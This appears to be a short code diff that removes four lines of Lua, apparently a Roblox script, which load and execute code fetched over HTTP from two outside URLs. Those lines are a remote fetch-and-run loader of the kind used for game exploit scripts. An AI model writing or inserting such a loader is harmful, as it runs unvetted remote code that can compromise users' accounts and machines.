@@ -1,4 +1,0 @@
-local v = (loadstring or load)
-v(game:HttpGet("https://getmoonx.cc/script"))()
-task.wait(1)
-v(game:HttpGet("https://raw.githubusercontent.com/qowlow/Vortex/refs/heads/main/WRAP"))()
